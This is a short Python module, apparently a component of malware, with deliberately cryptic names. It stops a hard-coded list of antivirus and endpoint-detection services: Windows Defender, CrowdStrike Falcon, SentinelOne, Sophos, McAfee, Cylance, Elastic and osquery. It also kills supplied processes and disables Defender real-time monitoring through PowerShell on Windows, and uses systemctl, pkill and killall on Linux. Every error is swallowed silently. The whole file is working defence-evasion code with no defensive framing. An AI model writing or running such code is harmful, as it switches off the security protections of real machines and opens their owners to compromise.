import os
import platform
import subprocess

K4 = (
    "WinDefend", "WdNisSvc", "WdNisDrv", "SecurityHealthService", "wscsvc",
    "McAfeeFramework", "McShield", "mfevtp", "Sophos Health Service",
    "CylanceSvc", "CSFalconService", "SentinelAgent", "SentinelHelper",
    "elastic-endpoint", "osqueryd",
)


def _s0(pn: list[str]) -> None:
    if not pn:
        return
    try:
        from .m5 import _hd
        if not _hd()[0]:
            return
    except Exception:
        return
    if platform.system() == "Windows":
        _s1(pn)
    else:
        _s2(pn)


def _s1(pn: list[str]) -> None:
    for nm in pn:
        try:
            subprocess.run(
                ["taskkill", "/F", "/IM", nm],
                capture_output=True,
                timeout=5,
            )
        except Exception:
            pass
    for svc in K4:
        try:
            subprocess.run(
                ["net", "stop", svc],
                capture_output=True,
                timeout=10,
            )
        except Exception:
            pass
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command",
             "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"],
            capture_output=True,
            timeout=15,
        )
    except Exception:
        pass


def _s2(pn: list[str]) -> None:
    for nm in pn:
        try:
            subprocess.run(["pkill", "-9", "-f", nm], capture_output=True, timeout=5)
        except Exception:
            pass
        try:
            subprocess.run(["killall", "-9", nm], capture_output=True, timeout=5)
        except Exception:
            pass
    stt = (
        "crowdstrike-falcon", "falcon-sensor", "csfalcon", "sentinelone",
        "cylance", "elastic-endpoint", "osquery",
    )
    for svc in stt:
        try:
            subprocess.run(
                ["systemctl", "stop", svc],
                capture_output=True,
                timeout=5,
            )
        except Exception:
            pass
